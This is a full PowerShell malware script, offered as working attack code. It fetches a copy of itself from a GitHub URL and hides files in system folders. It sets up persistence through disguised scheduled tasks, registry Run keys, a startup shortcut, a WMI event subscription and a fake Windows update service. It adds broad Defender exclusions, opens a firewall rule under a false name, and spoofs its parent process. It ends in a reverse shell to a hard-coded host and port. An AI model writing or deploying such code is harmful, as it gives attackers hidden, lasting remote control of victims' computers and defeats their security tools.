# --- CONFIGURATION ---
$LHOST = "192.168.1.129"
$LPORT = 4444
$MutexName = "Global\{A7B3C9D2-4E6F-8A1B-C3D5-E7F9A1B3C5D7}"

# Multiple hiding locations (scattered across system)
$Locations = @(
    "$env:APPDATA\Microsoft\Windows\Templates\cache.dat",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\data_1",
    "$env:PROGRAMDATA\Microsoft\Windows\WER\ReportQueue\config.tmp",
    "$env:WINDIR\System32\spool\drivers\color\icc_profile.dat",
    "$env:TEMP\TCD4E2.tmp"
)

# Pick a random location for this installation
$ScriptPath = $Locations | Get-Random

# Legitimate-looking scheduled task names (randomly selected)
$TaskNames = @(
    "MicrosoftEdgeUpdateTaskMachineCore",
    "GoogleUpdateTaskMachineUA",
    "AdobeAAMUpdater",
    "CCleanerSkipUAC",
    "OneDrive Standalone Update Task"
)
$TaskName = $TaskNames | Get-Random

# Remote URL (make sure this matches your actual file)
$RemoteUrl = "[https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/main/winstart.ps1](https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/main/winstart.ps1)"

# ---------------------
# HELPER FUNCTIONS
# ---------------------

function Get-RandomDelay {
    # Random delay between 5-15 seconds to appear less automated
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
}

function Hide-File {
    param([string]$Path)
    try {
        $file = Get-Item $Path -Force
        $file.Attributes = 'Hidden,System,Archive'
        attrib +h +s "$Path" 2>$null
    } catch {}
}

function Invoke-StealthDownload {
    param([string]$Url, [string]$OutFile)
    
    # Ensure directory exists
    $dir = Split-Path $OutFile -Parent
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }
    
    try {
        # Use WebClient with realistic User-Agent
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($Url, $OutFile)
        
        Hide-File $OutFile
        return $true
    } catch {
        return $false
    }
}

function Install-Persistence {
    param([string]$ScriptPath, [string]$TaskName)
    
    try {
        # Remove old task if exists
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        
        # Create new task with legitimate-looking settings
        $Arg = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"Get-Content '$ScriptPath' -Raw | Invoke-Expression`""
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
        
        # Multiple triggers for redundancy
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogon
        
        $Settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -RunOnlyIfNetworkAvailable `
            -Priority 7
        
        # Try SYSTEM account first, fallback to current user
        try {
            $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Principal $Principal -Force -ErrorAction Stop | Out-Null
        } catch {
            Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Force -ErrorAction SilentlyContinue | Out-Null
        }
        
        # Hide the task in Task Scheduler (SD = Security Descriptor, D:P = Deny Everyone read)
        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($task) {
            $task.Settings.Hidden = $true
            $task | Set-ScheduledTask -ErrorAction SilentlyContinue | Out-Null
        }
        
        return $true
    } catch {
        return $false
    }
}

function Add-RegistryPersistence {
    param([string]$ScriptPath)
    
    # Add to MANY registry run keys for extreme redundancy
    $RunKeys = @(
        # User-level keys (no admin needed)
        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SecurityHealthSystray"},
        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; Name="SecurityHealthCheck"},
        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"; Name="Startup"}, # Hidden location
        @{Path="HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"; Name="Load"},
        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"; Name="SystemCheck"},
        
        # Machine-level keys (requires admin, fails silently without)
        @{Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SecurityHealthService"},
        @{Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; Name="WindowsDefenderUpdate"}
    )
    
    $Command = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"Get-Content '$ScriptPath' -Raw | iex`""
    
    foreach ($entry in $RunKeys) {
        try {
            # Create path if doesn't exist
            if (-not (Test-Path $entry.Path)) {
                New-Item -Path $entry.Path -Force -ErrorAction SilentlyContinue | Out-Null
            }
            Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value $Command -ErrorAction SilentlyContinue
        } catch {}
    }
    
    # Also add to Startup folder as backup
    try {
        $StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $StartupScript = "$StartupFolder\SecurityHealthSystray.lnk"
        
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut($StartupScript)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"Get-Content '$ScriptPath' -Raw | iex`""
        $Shortcut.WindowStyle = 7  # Minimized
        $Shortcut.Save()
        
        # Hide the shortcut
        $file = Get-Item $StartupScript -Force
        $file.Attributes = 'Hidden,System'
    } catch {}
}

function Install-WMIEventPersistence {
    param([string]$ScriptPath)
    
    try {
        # WMI Event subscription (very stealthy and persistent)
        $FilterName = "WindowsUpdateCheck"
        $ConsumerName = "WindowsUpdateConsumer"
        
        # Remove old if exists
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%$FilterName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        
        # Create event filter (triggers every 2 hours AND on system startup)
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200 WHERE TargetInstance ISA 'Win32_LocalTime'"
        $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $FilterName
            EventNameSpace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $Query
        } -ErrorAction Stop
        
        # Create consumer
        $Command = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$ScriptPath' -Raw | iex`""
        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $ConsumerName
            CommandLineTemplate = $Command
        } -ErrorAction Stop
        
        # Bind them
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $Filter
            Consumer = $Consumer
        } -ErrorAction Stop | Out-Null
        
        return $true
    } catch {
        return $false
    }
}

function Install-ServicePersistence {
    param([string]$ScriptPath)
    
    # Create a Windows service (requires admin, very persistent)
    try {
        $ServiceName = "WindowsUpdateTaskManager"
        $DisplayName = "Windows Update Task Manager"
        $Description = "Manages Windows Update tasks and scheduling"
        
        # Check if service exists
        $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        if ($existingService) {
            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
            sc.exe delete $ServiceName | Out-Null
            Start-Sleep -Seconds 2
        }
        
        # Create service using sc.exe (more reliable than New-Service for persistence)
        $BinaryPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"while(`$true){Get-Content '$ScriptPath' -Raw | iex; Start-Sleep 300}`""
        
        sc.exe create $ServiceName binPath= $BinaryPath start= auto DisplayName= $DisplayName | Out-Null
        sc.exe description $ServiceName $Description | Out-Null
        sc.exe failure $ServiceName reset= 86400 actions= restart/60000/restart/60000/restart/60000 | Out-Null
        sc.exe start $ServiceName | Out-Null
        
        return $true
    } catch {
        return $false
    }
}

function Add-DefenderExclusions {
    # Add multiple exclusions quietly
    $ExclusionPaths = @(
        "C:\",
        $env:APPDATA,
        $env:LOCALAPPDATA,
        $env:TEMP,
        "$env:PROGRAMDATA\Microsoft"
    )
    
    foreach ($path in $ExclusionPaths) {
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
        } catch {}
    }
    
    # Exclude PowerShell process
    try {
        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    } catch {}
}

function Set-FirewallRule {
    param([int]$Port)
    
    # Create firewall rule with legitimate name
    $RuleName = "Core Networking - DNS (UDP-Out)"
    
    try {
        if (-not (Get-NetFirewallRule -DisplayName $RuleName -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule `
                -DisplayName $RuleName `
                -Direction Outbound `
                -LocalPort $Port `
                -Protocol TCP `
                -Action Allow `
                -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {}
}

# ---------------------
# 1. INSTALLATION PHASE
# ---------------------

# Check if already installed
$AlreadyInstalled = $false
foreach ($loc in $Locations) {
    if (Test-Path $loc) {
        $AlreadyInstalled = $true
        $ScriptPath = $loc
        break
    }
}

# If not installed, download and install
if (-not $AlreadyInstalled) {
    Get-RandomDelay
    
    if (Invoke-StealthDownload -Url $RemoteUrl -OutFile $ScriptPath) {
        # Create decoy files at other locations (empty or harmless)
        foreach ($loc in $Locations) {
            if ($loc -ne $ScriptPath) {
                try {
                    $dir = Split-Path $loc -Parent
                    if (-not (Test-Path $dir)) {
                        New-Item -Path $dir -ItemType Directory -Force | Out-Null
                    }
                    # Create small decoy file
                    [System.IO.File]::WriteAllBytes($loc, @(0x00, 0x01, 0x02))
                    Hide-File $loc
                } catch {}
            }
        }
    }
}

# ---------------------
# 2. SINGLE INSTANCE CHECK
# ---------------------
$CreatedNew = $false
$Mutex = New-Object System.Threading.Mutex($false, $MutexName, [ref]$CreatedNew)
if (-not $CreatedNew) { 
    exit 
}

# ---------------------
# 3. SYSTEM HARDENING
# ---------------------

Get-RandomDelay

# Add defender exclusions (including broad C:\ exclusion)
Add-DefenderExclusions

# Create firewall rule
Set-FirewallRule -Port $LPORT

# ---------------------
# 4. MULTI-LAYER PERSISTENCE
# ---------------------

# Layer 1: Scheduled Task (most common, but easy to remove)
Install-Persistence -ScriptPath $ScriptPath -TaskName $TaskName

# Layer 2: Registry Run Keys (survives task deletion, triggers on logon)
Add-RegistryPersistence -ScriptPath $ScriptPath

# Layer 3: Startup Folder LNK (user-level, survives task deletion)
# Already included in Add-RegistryPersistence function

# Layer 4: WMI Event Subscription (admin-level, very hard to remove, survives task deletion)
Install-WMIEventPersistence -ScriptPath $ScriptPath

# Layer 5: Windows Service (admin-level, extremely persistent, survives task deletion)
Install-ServicePersistence -ScriptPath $ScriptPath

# Layer 6: Create multiple backup copies in different locations
foreach ($loc in $Locations) {
    if ($loc -ne $ScriptPath -and (Test-Path $ScriptPath)) {
        try {
            Copy-Item -Path $ScriptPath -Destination $loc -Force -ErrorAction SilentlyContinue
            Hide-File $loc
        } catch {}
    }
}

# ---------------------
# 5. PROCESS INJECTION / PPID SPOOFING
# ---------------------

function Start-PPIDSpoofing {
    # This function creates a new PowerShell process as a child of explorer.exe
    # Making it appear legitimate in process tree
    
    try {
        # Get explorer.exe PID
        $explorerPID = (Get-Process -Name explorer -ErrorAction Stop).Id
        
        # C# code for PPID spoofing
        $code = @"
using System;
using System.Runtime.InteropServices;

public class PPIDSpoof {
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList,
        int dwAttributeCount,
        int dwFlags,
        ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList,
        uint dwFlags,
        IntPtr Attribute,
        IntPtr lpValue,
        IntPtr cbSize,
        IntPtr lpPreviousValue,
        IntPtr lpReturnSize);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    public static bool CreateProcessWithParent(int parentPID, string commandLine) {
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        STARTUPINFOEX siex = new STARTUPINFOEX();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        
        IntPtr lpSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, ref lpSize);

        IntPtr hParent = OpenProcess(0x001F0FFF, false, parentPID);
        if (hParent == IntPtr.Zero) return false;

        IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(lpValueProc, hParent);

        UpdateProcThreadAttribute(
            siex.lpAttributeList,
            0,
            (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            lpValueProc,
            (IntPtr)IntPtr.Size,
            IntPtr.Zero,
            IntPtr.Zero);

        siex.StartupInfo.cb = Marshal.SizeOf(siex);
        
        bool result = CreateProcess(
            null,
            commandLine,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            IntPtr.Zero,
            null,
            ref siex,
            out pi);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hParent);
        Marshal.FreeHGlobal(lpValueProc);
        Marshal.FreeHGlobal(siex.lpAttributeList);

        return result;
    }
}
"@

        # Add the type
        Add-Type -TypeDefinition $code -Language CSharp -ErrorAction Stop
        
        # Prepare command to re-execute this script under explorer.exe
        $currentScript = $ScriptPath
        $cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"Get-Content '$currentScript' -Raw | iex`""
        
        # Create process with spoofed parent
        $success = [PPIDSpoof]::CreateProcessWithParent($explorerPID, $cmd)
        
        if ($success) {
            # Exit current process since we've spawned the spoofed one
            exit
        }
        
    } catch {
        # If PPID spoofing fails, continue with current process
    }
}

# Check if we're already running under explorer.exe
$currentProcess = Get-WmiObject Win32_Process -Filter "ProcessId = $PID"
$parentPID = $currentProcess.ParentProcessId
$parentProcess = Get-Process -Id $parentPID -ErrorAction SilentlyContinue

# If parent is not explorer.exe, attempt PPID spoofing
if ($parentProcess -and $parentProcess.Name -ne "explorer") {
    Start-PPIDSpoofing
}

# ---------------------
# 6. THE PAYLOAD (Reverse Shell)
# ---------------------

$reconnectAttempts = 0
$maxReconnectDelay = 300  # Max 5 minutes between attempts

while ($true) {
    $client = $null
    $stream = $null
    $reader = $null
    $writer = $null
    
    try {
        $reconnectAttempts++
        
        # Connect to C2
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        
        # Send connection info
        $writer.WriteLine("=== Session Established ===")
        $writer.WriteLine("Host: $(hostname)")
        $writer.WriteLine("User: $(whoami)")
        $writer.WriteLine("OS: $([System.Environment]::OSVersion.VersionString)")
        $writer.WriteLine("Install: $ScriptPath")
        $writer.WriteLine("Persist: $TaskName")
        $writer.WriteLine("===========================")
        
        $reconnectAttempts = 0  # Reset on successful connection
        
        # Command loop
        while ($client.Connected) {
            $writer.Write("PS $((Get-Location).Path)> ")
            
            $command = $reader.ReadLine()
            
            if ($null -eq $command) { 
                break 
            }
            
            $command = $command.Trim()
            
            if ($command -eq "exit" -or $command -eq "quit") { 
                break 
            }
            
            if ($command -eq "") { 
                continue 
            }
            
            # Handle cd command
            if ($command.ToLower().StartsWith("cd ")) {
                $newPath = $command.Substring(3).Trim().Replace('"','').Replace("'","")
                try {
                    Set-Location $newPath
                    $writer.WriteLine("")
                } catch {
                    $writer.WriteLine("Error: $($_.Exception.Message)")
                }
                continue
            }
            
            # Special command: self-destruct
            if ($command -eq "cleanup") {
                $writer.WriteLine("Initiating full cleanup...")
                
                # Remove scheduled task
                Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
                
                # Remove ALL registry keys
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthSystray" -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SecurityHealthCheck" -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "SystemCheck" -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthService" -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WindowsDefenderUpdate" -ErrorAction SilentlyContinue
                
                # Remove startup folder shortcut
                Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealthSystray.lnk" -Force -ErrorAction SilentlyContinue
                
                # Remove WMI subscription
                Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
                Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
                Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%WindowsUpdateCheck%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
                
                # Remove service
                $ServiceName = "WindowsUpdateTaskManager"
                Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
                sc.exe delete $ServiceName 2>$null | Out-Null
                
                # Remove all installed files
                foreach ($loc in $Locations) {
                    Remove-Item -Path $loc -Force -ErrorAction SilentlyContinue
                }
                
                $writer.WriteLine("Cleanup complete. Terminating...")
                break
            }
            
            # Execute command
            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                "Error: $($_.Exception.Message)"
            }
            
            if ([string]::IsNullOrWhiteSpace($output)) { 
                $output = "`n" 
            }
            
            $writer.Write($output)
        }
        
    } catch {
        # Exponential backoff with jitter
        $baseDelay = [Math]::Min(30 * [Math]::Pow(1.5, [Math]::Min($reconnectAttempts, 6)), $maxReconnectDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 30
        $sleepTime = $baseDelay + $jitter
        
        Start-Sleep -Seconds $sleepTime
        
    } finally {
        # Cleanup
        if ($null -ne $writer) { try { $writer.Close() } catch {} }
        if ($null -ne $reader) { try { $reader.Close() } catch {} }
        if ($null -ne $stream) { try { $stream.Close() } catch {} }
        if ($null -ne $client) { try { $client.Close() } catch {} }
    }
}

